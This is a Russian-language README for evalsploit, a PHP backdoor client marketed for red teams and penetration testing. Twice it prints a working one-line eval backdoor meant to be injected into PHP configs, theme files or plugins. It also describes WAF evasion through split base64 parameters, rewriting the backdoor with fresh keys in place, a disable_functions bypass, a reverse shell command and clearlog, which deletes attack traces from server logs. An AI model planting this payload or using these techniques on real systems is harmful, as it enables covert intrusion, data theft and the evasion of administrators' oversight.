# evalsploit 3.1

> PHP-клиент для бэкдора для red team и тестирования на проникновение. <br>
> Работает там, где остальные отваливаются. Нет exec, нет шелла - Evalsploit, не проблема.

**Языки документации:** [English](README.md) | **Русский** | [中文](README_ZH.md)

---

## Почему evalsploit

Большинство PHP-клиентов для бэкдоров рассчитаны на возможность запуска системных команд. Реальные цели редко этим балуют - `exec()`, `system()`, `shell_exec()` и им подобные часто заблокированы через `disable_functions`. Ограничения PHP распространены на shared hosting, управляемом WordPress и в security-hardened стеках.

evalsploit создан именно для таких сред. Все файловые операции используют только встроенные функции PHP: `fopen`, `fread`, `fwrite`, `DirectoryIterator`, `copy`, `unlink`, `rename`. SQL-консоль работает через PDO. Grep и find используют `RecursiveIteratorIterator`. Шелл не нужен.

## Killer Features

### Однострочный пейлоад - внедряется куда угодно

```php
if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
```

Одна строка. Вставьте в любой исполняемый PHP-файл - конфиг, файл темы, хук плагина. Работает и как самостоятельный шелл. Ключ триггера `Z` и шумовой разделитель `V` настраиваются отдельно для каждой сессии.

### PHP 8 совместим

Weevely использует `create_function`, удалённую в PHP 8.0. evalsploit работает на PHP 5.6–8.x без каких-либо изменений.

### Нет exec, нет шелла - полный контроль над файлами всё равно есть

Все файловые операции идут через встроенные функции PHP. Даже в hardened-среде, где заблокированы все варианты exec, вы получаете полный доступ к чтению/записи файловой системы, листинг директорий, рекурсивный поиск, download, upload, редактирование на месте.

### Полиморфная мутация - смена ключей без повторной загрузки

`mutate` генерирует новый бэкдор со свежими случайными ключами, отправляет PHP, который перезаписывает строку бэкдора на сервере прямо на месте, и переключает клиент на новые ключи - всё одной командой. Без повторной загрузки, без ручных правок.

### Чанкованный download для больших файлов

Стандартные клиенты для бэкдоров загружают файл целиком в память PHP (ограничено `memory_limit`, обычно 128 МБ). Чанкованный download в evalsploit использует `fseek`/`fread` для передачи файлов блоками по 1 МБ в нескольких запросах с живым индикатором прогресса:

```
  45.0 MB / 512.0 MB (8%)
```

Переключение: `set download chunked` / `set download dl`.

### Случайный маркер ответа на каждый запрос

Вывод бэкдора оборачивается случайно сгенерированным маркером при каждом запросе. Никакой статичной строки для WAF-фингерпринтинга или корреляции логов. Каждый запрос выглядит по-разному.

### 3 режима отправки - обход WAF встроен

| Режим | Как работает |
|-------|-------------|
| **bypass** | Пейлоад base64 разбит на два POST-параметра (Z + шумовой разделитель V). Склеивается на стороне сервера. Ломает паттерн-матчинг фильтров. |
| **classic** | Полный base64 пейлоад в параметре Z. |
| **simple** | Сырой PHP в параметре Z. Полезно для отладки или незащищённых целей. |

Автоопределение при подключении: перебирает все режимы, сохраняет рабочий.

### SQL-консоль - MySQL и PostgreSQL, без отдельных плагинов

`sql user:pass@host/db` - одна команда покрывает MySQL и PostgreSQL через PDO. Интерактивный REPL, ASCII-таблица формируется на стороне сервера, `USE dbname` обрабатывается без лишних запросов. DSN сохраняется в сессию автоматически.

### Рекурсивный grep и find - без exec

```
grep -i "password" /var/www
find \.php$ /var/www/uploads
```

Оба используют PHP-итераторы внутри. Бинарники `grep` и `find` не нужны.

### Уничтожение следов - clearlog

```
clearlog detect                              <- найти все доступные лог-файлы, показать статус [rw]/[r-]
clearlog all /shell.php                      <- удалить строки по паттерну из всех доступных для записи логов
clearlog /var/log/nginx/access.log 1.2.3.4   <- один файл, конкретный паттерн
```

Паттерн по умолчанию - путь из URL вашей сессии.

### Обход disable_functions - эксплойты передаются как данные

Когда даже файловых операций недостаточно, `exploit` передаёт PHP-эксплойт (хранится локально в `exploits/`) прямо через eval-канал бэкдора. Покрывает PHP 7.0–8.5. Загрузка файлов не требуется - эксплойт поступает через eval.

### Плагины - расширение без правки ядра

Положите `.py`-файл в `evalsploit/plugins/`, используйте `@register("cmdname")`, и команда появится в сессии при следующем запуске. Ядро не трогается.

### Ротация прокси с живой валидацией

Загрузите список `host:port`, проверьте (живой GET через каждый) и используйте случайный или фиксированный прокси на сессию. Смена прокси внутри сессии без переподключения.

## Пейлоад

Одна строка, внедряется в любой исполняемый PHP:

```php
if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
```

После смены режима отправки или имён параметров выполните `gen`, чтобы получить соответствующий пейлоад.

---

## Режимы отправки

| Режим | Описание |
|-------|----------|
| **bypass** | Пейлоад base64 разбит разделителем на два параметра Z и V. Обходит часть WAF. |
| **classic** | Пейлоад base64 в параметре Z. |
| **simple** | Сырой PHP в параметре Z. Без разбора по маркеру - для отладки. |

Автоопределяется при подключении. Установить вручную: `set send bypass|classic|simple`.

## Команды

Пути с пробелами поддерживаются. Разделитель ` : ` используется для команд с двумя путями (`cp`, `ren`/`mv`, `upload` с удалённым путём).

| Команда | Описание |
|---------|----------|
| **ls**, **dir** | Список директории (`set ls ls` или `set ls dir`) |
| **cd**, **pwd**, **home** | Смена директории / вывод пути / перейти в `__DIR__` |
| **cat** | Вывод файла (`set cat bcat` / `set cat cat`) |
| **cp** | Копирование: `cp <откуда> : <куда>` |
| **rm**, **del** | Удаление (подтверждение при `set confirm 1`) |
| **ren**, **mv** | Переименование/перемещение: `ren <старое> : <новое>` |
| **download**, **get**, **dl** | Скачать: `download <remote>` или `download <remote> : <local>`. Поддерживает чанкованный режим (`set download chunked`) для больших файлов с прогрессом. |
| **upload**, **put**, **upl** | Загрузить: `upload <local>` или `upload <local> : <remote>` |
| **mkdir**, **mkd**, **md** | Создать директорию |
| **create**, **mkf** | Создать пустой файл |
| **touch**, **stat** | Обновить время / информация о файле |
| **edit** | Скачать -> редактировать локально -> загрузить |
| **grep** | Рекурсивный поиск в содержимом: `grep [-i] <паттерн> [путь]` (PHP regex) |
| **find** | Рекурсивный поиск по имени: `find <паттерн> [путь]` (PHP regex, без учёта регистра) |
| **clearlog** | Удалить строки с паттерном из лог-файлов: `clearlog detect` / `clearlog <path> [pattern]` / `clearlog all [pattern]`; паттерн по умолчанию = путь из URL конфига |
| **run** | Интерактивный шелл (exec/shell_exec/...) - `exit` для выхода |
| **php** | Интерактивная PHP-консоль - отправка сырого PHP на сервер |
| **exploit** | Обход disable_functions (PHP 7.0–8.5) |
| **try**, **detect** | Проверка доступных вариантов exec: `try run` |
| **reverse** | Reverse shell: `reverse <хост>:<порт>` |
| **sql** | SQL-консоль (PDO/MySQL/PostgreSQL): `sql [user:pass@host[:port][/db]]`; DSN сохраняется при успешном подключении; `exit` для выхода |
| **scan** | Рекурсивное сканирование, отчёт в `report/` |
| **info** | Информация о сервере: PHP, ОС, пользователь, `disable_functions`, `open_basedir` |
| **ping**, **check** | Проверка связи и задержки |
| **gen**, **generate** | Показать варианты пейлоада для текущих Z/V и режима отправки |
| **mutate** | Перезаписать бэкдор на сервере новым полиморфным пейлоадом; обновить Z/V |
| **set** | Настройки: `set <модуль> <значение>` или `set <модуль> help` |
| **proxy_switch** | Сменить прокси: без аргументов (random), N (прокси #N), random |
| **config** | Показать текущие настройки |
| **sessions**, **saved** | Список сохранённых сессий |
| **save \<имя\>** | Сохранить текущее подключение как сессию |
| **connect \<имя\>** | Загрузить и переключиться на сохранённую сессию |
| **menu** | Вернуться в стартовое меню (завершает текущую сессию) |
| **help**, **exit** | Справка / выход (оба запрашивают подтверждение) |

## Файлы сессий

Хранятся в `data/sessions/<имя>.ini`:

```ini
[SESSION]
url = https://target.com/shell.php
Z = mg1qjg
V = 3I15EA
send_mode = bypass
silent = 0
```

`save <имя>` создаёт сессию. `connect <имя>` загружает её. `silent` хранится в сессии.

## Режим silent

`set silent 1` - при подключении пропускает начальный `pwd` и определение режима отправки. Первая команда = первый запрос. Полезно для минимального трафика.

Сохраняется глобально и в файле сессии.

---

## Прокси

Стартовое меню -> **5. Прокси**: загрузить список из файла (`data/proxies.txt`, по одному `host:port` на строку), проверить (живой GET через каждый), включить random или фиксированный режим.

Внутри сессии:
- `set proxy 0` / `set proxy 1` - выключить/включить
- `set proxy show` - список проверенных прокси, выбор по номеру
- `set proxy switch` - другой случайный прокси
- `set proxy switch N` - переключиться на прокси #N
- `proxy_switch` - алиас

## Настройки (set)

| Настройка | Значения |
|-----------|---------|
| `set send` | `bypass`, `classic`, `simple` |
| `set run` | `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `expect_popen`, `pcntl_exec`, `do` |
| `set ls` / `set cat` | ключ сниппета (см. `snippets.ini`) |
| `set download` | `dl` (по умолчанию), `chunked` (большие файлы, индикатор прогресса) |
| `set silent` | `0`, `1` |
| `set confirm` | `0`, `1` - подтверждение перед rm/upload/edit |
| `set reverse` | `ivan`, `monkey` |
| `set grep` / `set find` | ключ сниппета |
| `set rm`, `set upload`, `set rename`, `set stat`, `set touch`, `set create`, `set mkdir`, `set cp` | ключ сниппета (алиасы принимаются) |

`set <настройка> help` показывает доступные значения. SQL DSN сохраняется автоматически при успешном подключении.

## Сниппеты

Файловые команды используют PHP-сниппеты из `evalsploit/modules/snippets/`, проиндексированные в `snippets.ini`. Смена варианта: `set <команда> <ключ>`. Неверные ключи сбрасываются при загрузке с предупреждением.

Примечательные варианты:
- `set download chunked` - чанкованный download по 1 МБ/запрос с прогрессом, без ограничений memory_limit PHP
- `set ls dir` - листинг в стиле Windows
- `set cat bcat` - бинарно-безопасное чтение файла

## Мутация

`mutate` генерирует новый полиморфный бэкдор (новые Z, V), отправляет PHP, который находит строку с `isset($_POST['Z'])` в целевом файле, заменяет её на новый бэкдор и записывает файл. Клиент обновляет ключи. Другие экземпляры бэкдора сохраняют старые ключи.

## Плагины

Положите `.py`-файл в `evalsploit/plugins/`. Файлы, начинающиеся с `_`, пропускаются.

Минимальный пример (`evalsploit/plugins/mycmd.py`):

```python
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

@register("mycmd", description="Краткое описание", usage="mycmd [path]")
class MyCmdModule(Module):
    def run(self, ctx, args):
        print(ctx.send("echo getcwd();").strip())
        return None
```

`ctx.send(php)` - отправить PHP на сервер и получить вывод.
`ctx.resolve_path(path)` - разрешить путь относительно текущего pwd.
`php_quote(s)` - экранировать строку для PHP-литерала в одинарных кавычках.
`confirm_dangerous(ctx, action, detail)` - запрос перед деструктивными операциями.

Подробнее: `evalsploit/plugins/README.md` и `example_cwd.py`.

```
evalsploit/
├── cli.py              - стартовое меню, цикл сессии, help
├── config.py           - настройки, загрузка/сохранение сессий, валидация ключей сниппетов
├── context.py          - SessionContext: url, pwd, send(), хелперы путей
├── transport/
│   ├── send.py         - HTTP POST, кодирование пейлоада, разбор ответа по маркеру
│   └── payloads.py     - генерация полиморфного бэкдора, PHP для мутации
├── modules/
│   ├── registry.py     - декоратор @register, словари COMMANDS/COMMAND_HELP
│   ├── base.py         - базовый класс Module, загрузчик сниппетов, php_quote, substitute
│   ├── snippets/       - PHP-шаблоны (ls, cat, dl, grep, find, sql, ...)
│   └── file/ set/ ...  - модули команд
└── plugins/            - пользовательские плагины (автозагрузка при старте)
exploits/               - PHP-эксплойты обхода disable_functions (передаются через eval)
data/                   - settings.ini, sessions/, proxies.txt, downloads/
```

## Сравнение с аналогами

### Матрица функций

| Функция | evalsploit | Weevely 3 | PhpSploit |
|---------|------------|-----------|-----------|
| Совместимость с PHP 8 | **да** | нет (`create_function` удалён) | да |
| Без exec/shell | **да** (только встроенные PHP) | частично | частично |
| Случайный маркер на каждый запрос | **да** | нет (статичный MD5-маркер) | нет |
| Полиморфная мутация | **да** (перезапись на сервере) | нет | нет |
| Режим silent | **да** | нет | нет |
| 3 режима отправки (bypass/classic/simple) | **да** | нет | нет |
| SQL-консоль | **да** (PDO, MySQL+PostgreSQL) | да (mysqli/pg_*) | да (отдельный плагин на каждую СУБД) |
| Рекурсивный grep/find без exec | **да** | частично | нет |
| Чанкованный download (большие файлы) | **да** (1 МБ/запрос, прогресс) | нет | нет |
| Уничтожение следов (clearlog) | **да** (плагин) | да | да |
| Обход disable_functions | **да** (PHP 7.0–8.5) | да | да |
| Плагины | **да** (один .py файл) | да | да |

### Weevely

Weevely использует XOR+gzip+base64 транспорт со статичными MD5-маркерами на деплой - каждый инстанс идентифицируем. Опирается на `create_function` для обфускации - удалена в PHP 8.0. evalsploit использует случайный маркер на каждый запрос, работает на PHP 5.6–8.x и не требует exec для файловых операций.

### PhpSploit

PhpSploit - полноценный C2 с туннелированием в HTTP-заголовках, системой плагинов и отдельными SQL-модулями на каждую СУБД. evalsploit покрывает MySQL и PostgreSQL одной командой `sql` через PDO. Сессии - простые `.ini`-файлы. Режим silent и полиморфная мутация в PhpSploit отсутствуют.
